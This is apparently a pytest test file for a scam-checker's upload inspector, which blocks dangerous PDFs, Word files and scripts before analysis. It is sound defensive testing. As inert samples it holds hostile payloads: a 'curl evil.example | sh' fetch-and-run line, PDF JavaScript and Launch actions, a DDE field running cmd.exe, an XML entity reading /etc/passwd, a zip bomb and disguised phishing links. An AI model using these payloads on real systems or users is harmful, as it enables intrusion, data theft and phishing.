"""Document uploads: dangerous files are refused before anything reads them, safe ones are checked like messages.

Every "attack" here is a harmless sample that only has the shape of one (an alert(1) script, the EICAR
test string, a template URL that is never fetched)."""

import asyncio
import io
import struct
import zipfile

import pytest

from app.files import DocumentInspector
from app.files.clamav import scan_bytes
from app.files.static import EICAR, pdf_names
from app.signals.content import scan_content
from app.signals.links import extract_urls, static_checks
from tests.docfiles import docx, pdf, pdf_hidden_js, rel
from tests.fakes import FakeAnalyzer, analysis
from tests.test_api import make_client, png_bytes


class RecordingAnalyzer(FakeAnalyzer):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.calls: list[str | None] = []

    async def analyze(self, text, image, check_links):
        self.calls.append(text)
        return await super().analyze(text, image, check_links)


def upload(c, data: bytes, name: str = "file.pdf", text: str | None = None):
    form = {"text": text} if text else {}
    return c.post("/api/scan", files={"document": (name, data, "application/octet-stream")}, data=form)


def inspect(data: bytes, **kw):
    return asyncio.run(DocumentInspector(**kw).inspect(data))


# --- what gets refused, without being read


@pytest.mark.parametrize(
    "data, finding",
    [
        (pdf(extra="/OpenAction << /S /JavaScript /JS (app.alert(1)) >>"), "pdf_javascript"),
        (pdf(extra="/OpenAction << /S /J#61vaScript /J#53 (app.alert(1)) >>"), "pdf_obfuscated_names"),
        (pdf(extra="/OpenAction << /S /Launch /F (cmd.exe) >>"), "pdf_launch"),
        (pdf() + EICAR, "antivirus_test_file"),
        (docx(macro=True, files={"word/vbaProject.bin": b"\x00"}), "macros"),
        (docx(rels=rel("attachedTemplate", "https://evil.example/t.dotm")), "remote_template"),
        (docx(rels=rel("oleObject", "mhtml:https://evil.example/x.html!x-usc:https://evil.example/x")), "unsafe_link_handler"),
        (docx(files={"word/embeddings/oleObject1.bin": b"\x00"}), "embedded_object"),
        (docx(files={"word/activeX/activeX1.xml": b"<a/>"}), "activex"),
        (
            docx(
                body_extra='<w:p><w:r><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r></w:p>'
            ),
            "dde_field",
        ),
        (b"MZ\x90\x00" + bytes(200), "file_is_windows_program"),
        (b"#!/bin/sh\ncurl evil.example | sh\n", "file_is_script"),
        (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(200), "file_is_legacy_office"),
        (b"<html><script>alert(1)</script></html>", "file_is_web_page"),
        (b"MZ" + bytes(100) + pdf(), "file_is_windows_program"),
        (b"garbage" + pdf(), "polyglot_file"),
        (b"%PDF-1.7\nnot really a pdf", "unreadable_file"),
    ],
)
def test_dangerous_files_are_blocked(data, finding):
    result = inspect(data)
    assert result.blocked
    assert finding in {f.name for f in result.check.findings}
    assert result.text == ""  # nothing from a blocked file is passed on


def test_xml_entity_tricks_are_refused():
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr(
            "word/document.xml",
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            "<w:body><w:p><w:r><w:t>&e;</w:t></w:r></w:p></w:body></w:document>",
        )
    result = inspect(out.getvalue())
    assert result.blocked and "xml_entity_trick" in {f.name for f in result.check.findings}
    assert "root:" not in result.text


def test_zip_bombs_are_refused():
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", b"\x00" * 50_000_000)  # 50 MB of zeros squeezes to ~50 KB
    result = inspect(out.getvalue())
    assert result.blocked and result.check.findings[0].name == "zip_bomb"


def test_a_hung_reader_is_killed_and_the_file_refused():
    result = inspect(pdf(), timeout_s=0.0001)
    assert result.blocked and result.check.findings[0].name == "unreadable_file"


def test_password_protected_pdf_is_not_opened():
    from pypdf import PdfReader, PdfWriter

    w = PdfWriter(clone_from=PdfReader(io.BytesIO(pdf())))
    w.encrypt("s3cret")
    buf = io.BytesIO()
    w.write(buf)
    result = inspect(buf.getvalue())
    assert result.blocked and result.check.findings[0].name == "password_protected"


def test_compressed_object_streams_cant_hide_javascript():
    data = pdf_hidden_js()
    assert b"JavaScript" not in data  # invisible to the raw-byte scan...
    result = inspect(data)
    assert result.blocked and "pdf_javascript" in {f.name for f in result.check.findings}  # ...not to the reader


# --- safe files are read, in the sandbox


def test_clean_pdf_text_and_links_are_read():
    result = inspect(pdf(uri="https://usps-redelivery-help.com/pay"))
    assert result.check.status == "clean" and not result.blocked
    assert "Pay the fee" in result.text and result.urls == ["https://usps-redelivery-help.com/pay"]
    assert len(result.check.sha256) == 64 and result.check.pages == 1


def test_clean_docx_text_and_links_are_read():
    result = inspect(docx(rels=rel("hyperlink", "https://example.com/apply")))
    assert result.check.status == "clean"
    assert "@HR_Careers_Dept" in result.text and result.urls == ["https://example.com/apply"]


def test_remote_image_is_a_warning_not_a_block():
    result = inspect(docx(rels=rel("image", "https://tracker.example/pixel.png")))
    assert result.check.status == "warning" and not result.blocked and result.text


def test_raw_scan_reads_hex_escaped_names():
    names = {f.name for f in pdf_names(b"%PDF-1.7 /J#61va#53cript (x)")}
    assert {"pdf_javascript", "pdf_obfuscated_names"} <= names


# --- through the API


def test_api_blocked_file_never_reaches_the_ai(tmp_path):
    ai = RecordingAnalyzer()
    with make_client(tmp_path, ai) as c:
        body = upload(c, pdf(extra="/OpenAction << /S /JavaScript /JS (app.alert(1)) >>")).json()
    assert ai.calls == []
    assert body["verdict"] == "scam" and body["file_check"]["status"] == "blocked"
    assert body["scam_type"] == "malware" and body["extracted_text"] == ""
    assert "Don't open" in body["headline"]


def test_api_clean_document_is_analyzed_with_its_links(tmp_path):
    ai = RecordingAnalyzer(analysis(scam_probability=30))
    with make_client(tmp_path, ai) as c:
        body = upload(c, pdf(uri="https://www.paypal.com@evil-login.top/secure"), text="my aunt got this").json()
    assert body["file_check"]["status"] == "clean"
    assert "my aunt got this" in ai.calls[0] and "Pay the fee" in ai.calls[0]
    assert body["risk_score"] >= 85  # the hidden "@" link in the PDF still sets the floor
    assert any(link["host"] == "evil-login.top" for link in body["links"])


def test_api_document_without_text_asks_for_a_screenshot(tmp_path):
    with make_client(tmp_path, FakeAnalyzer()) as c:
        r = upload(c, pdf(text=""))
    assert r.status_code == 400 and "screenshot" in r.json()["detail"]


def test_api_one_file_at_a_time(tmp_path):
    with make_client(tmp_path, FakeAnalyzer()) as c:
        r = c.post(
            "/api/scan",
            files={"document": ("a.pdf", pdf(), "application/pdf"), "image": ("a.png", png_bytes(), "image/png")},
        )
    assert r.status_code == 400


def test_api_antivirus_down_refuses_files(tmp_path):
    with make_client(tmp_path, FakeAnalyzer(), clamav_host="127.0.0.1", clamav_port=1) as c:
        r = upload(c, pdf())
    assert r.status_code == 503


# --- ClamAV protocol, against a fake clamd


def _fake_clamd(reply: bytes):
    async def handle(reader, writer):
        assert await reader.readuntil(b"\0") == b"zINSTREAM\0"
        while True:
            (n,) = struct.unpack("!I", await reader.readexactly(4))
            if n == 0:
                break
            await reader.readexactly(n)
        writer.write(reply)
        await writer.drain()
        writer.close()

    return handle


@pytest.mark.parametrize(
    "reply, expected", [(b"stream: OK\0", None), (b"stream: Win.Test.EICAR_HDB-1 FOUND\0", "Win.Test.EICAR_HDB-1")]
)
def test_clamav_instream(reply, expected):
    async def run():
        server = await asyncio.start_server(_fake_clamd(reply), "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        async with server:
            return await scan_bytes(b"x" * 200_000, "127.0.0.1", port)

    assert asyncio.run(run()) == expected


# --- message content


def test_message_content_checks():
    names = lambda t: {f.name for f in scan_content(t)}  # noqa: E731
    assert "hidden_direction_characters" in names("Open invoice\u202efdp.exe")
    assert "script_link" in names("click javascript:alert(1)")
    assert "double_extension" in names("see attached statement.pdf.exe")
    assert "hidden_zero_width_characters" in names("Pay\u200bPal alert")
    assert names("family photo \U0001f468\u200d\U0001f469\u200d\U0001f467 at paypal.com, built with node.js") == set()


def test_program_download_links():
    [url] = extract_urls("Install the update: https://secure-update.example.net/Chrome_Update.apk")
    assert "dangerous_download" in {c.name for c in static_checks(url).checks}


def test_hidden_characters_set_a_floor(tmp_path):
    with make_client(tmp_path, FakeAnalyzer(analysis(scam_probability=10))) as c:
        body = c.post("/api/scan", data={"text": "Your invoice is attached: invoice\u202efdp.exe"}).json()
    assert body["risk_score"] >= 85
    assert any(f["source"] == "content_check" for f in body["red_flags"])


# --- fail closed, and no slow regexes


def test_docx_with_a_malformed_part_is_refused():
    result = inspect(docx(files={"word/_rels/header1.xml.rels": b"<Relationships><unclosed"}))
    assert result.blocked and "unreadable_parts" in {f.name for f in result.check.findings}


def test_pdf_with_a_damaged_object_stream_is_refused():
    import zlib

    data = pdf_hidden_js()
    packed = zlib.compress(b"7 0 << /S /JavaScript /JS (app.alert(1)) >>")
    at = data.index(packed)
    damaged = data[:at] + bytes(len(packed)) + data[at + len(packed) :]  # the reader can't see inside any more
    result = inspect(damaged)
    assert result.blocked and "unreadable_parts" in {f.name for f in result.check.findings}


def test_pdf_with_a_missing_reference_is_still_read():
    assert not inspect(pdf(extra="/Metadata 99 0 R")).blocked  # nothing is there to hide code in


def test_content_checks_stay_fast_on_hostile_input():
    import time

    for text in ("a-" * 10_000, "a" * 20_000 + ".", ("x" * 99 + ".pdf ") * 200):
        start = time.perf_counter()
        scan_content(text)
        assert time.perf_counter() - start < 0.5
